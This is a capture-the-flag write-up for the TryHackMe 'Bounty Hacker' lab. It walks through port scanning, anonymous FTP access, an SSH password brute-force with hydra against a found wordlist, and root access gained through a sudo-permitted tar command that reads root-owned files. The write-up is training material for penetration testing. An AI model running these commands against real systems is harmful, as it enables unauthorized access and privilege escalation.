# Bounty Hacker
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

Compromise the machine and read the user.txt and root.txt.

Tags
--
* FTP Anonymous Login
* Brute Forcing
* Sudoers file

Tools used
--
* nmap
* ftp
* hydra
* ssh
* /bin/tar

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.163.191
* Other information must be gathered during the attack

Phase 1: Enumeration
--
```
sudo nmap -sS -sC -sV 10.10.163.191 -p- -T5 -vvv

<SNIP>
Initiating SYN Stealth Scan at 23:29
Scanning 10.10.163.191 [65535 ports]
Discovered open port 22/tcp on 10.10.163.191
Discovered open port 21/tcp on 10.10.163.191
Discovered open port 80/tcp on 10.10.163.191
<SNIP>
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.98.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
<SNIP>
```
We see a FTP server we can access by anonymous login:
```
ftp -n 10.10.163.191
Connected to 10.10.163.191.
220 (vsFTPd 3.0.3)
ftp> user anonymous
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
ftp> get task.txt
```
Let's read these two files:
```
cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
and
```
cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
Phase 2: Foothold
--

Try to bruteforce `lin` username with `locks.txt` file for SSH by Hydra:
```
hydra -l lin -P locks.txt 10.10.163.191 ssh -I

<SNIP>
[DATA] attacking ssh://10.10.163.191:22/
[22][ssh] host: 10.10.163.191   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
<SNIP>
```
Then:
```
ssh 10.10.163.191 -l lin
<RedDr4gonSynd1cat3>
```
Here, you can get quickly the user flag.

Phase 3: Privilege Escalation
--
Run:
```
sudo -l

Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
At this point, I can use `tar` for zipping `/root/root.txt` and saving it in `lin` home folder, so we can access to it:
```
sudo /bin/tar -cf /home/lin/root.tar /root/root.txt 
```
From `lin` home folder, run:
```
tar -xvf root.tar
cat root/root.txt
```
You will get the root flag.